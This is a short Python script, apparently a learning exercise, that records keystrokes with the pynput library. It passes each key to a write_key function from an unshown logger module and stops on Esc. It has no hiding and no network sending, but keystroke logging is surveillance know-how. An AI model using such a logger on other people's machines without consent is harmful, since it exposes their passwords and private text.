from pynput.keyboard import Listener
from logger import write_key

from pynput import keyboard

def on_press(key):
    if key == keyboard.Key.esc:
        return False  # This stops the listener
    write_key(key)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
